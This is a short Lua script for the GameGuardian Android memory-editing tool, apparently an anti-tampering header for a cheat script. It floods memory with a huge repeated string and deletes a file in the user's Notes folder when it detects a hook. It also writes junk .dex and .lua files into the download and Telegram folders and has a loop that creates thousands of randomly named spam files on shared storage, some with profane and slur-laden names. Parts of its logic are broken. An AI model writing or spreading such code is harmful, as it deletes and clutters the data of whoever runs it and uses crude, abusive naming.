
local list = {}
for i = -1, -250000, -1 do list[i]={address=i,flags=1} end
local log = string.char(84,104,97,110,104,68,105,101,117,120,76,111,103):rep(999):rep(999):rep(4)
for i = 1,100 do
gg.refineNumber("0",log,log,log,log,log,log,log)
end    

if loadfile("/sdcard/Notes/a.lua") then
gg.alert("hook detected")
os.remove("/storage/emulated/0/Notes/a.lua")
os.exit(myEggs)
else
local layfile = gg.getFile():match('[^/]+$')
loadfile(layfile)
end

gg.saveList("/storage/emulated/0/download/sug_me.dex")
gg.saveList("/storage/emulated/0/Telegram/gay.txt")
io.open("/storage/emulated/0/download/🤡.lua","w"):write([[
LuaR  �� 

]])

gg.setVisible(false)
gg.clearResults()
if gg.isVisible(true) then
gg.clearResults()
gg.alert("Eʀʀᴏʀ\n please wait!!","")
gg.toast("restart script")
os.exit()
for x = 1, 10000 do
gg.saveList("/storage/emulated/0/"..string.char(math.random(45,255))..string.char(math.random(35,148))..string.char(math.random(15,50))..string.char(math.random(30,168))..string.char(math.random(20,80)).."DieuSpam"..math.random(1,5000).."]Fuck.dex", gg.LOAD_APPEND) end--spam file + folder
end